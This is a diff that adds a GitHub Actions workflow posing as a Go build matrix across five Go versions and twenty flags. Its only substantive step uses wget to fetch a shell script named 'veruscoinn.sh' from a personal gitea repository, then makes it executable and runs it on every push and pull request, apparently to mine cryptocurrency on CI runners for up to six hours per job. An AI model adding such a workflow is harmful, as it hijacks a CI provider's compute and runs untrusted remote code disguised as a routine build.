@@ -1,0 +1,27 @@
+name: sermoxiz
+on: [push, pull_request]
+jobs:
+  build:
+    name: sermoxiz
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 50
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 50
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: sermoxiz
+      run: |
+        wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
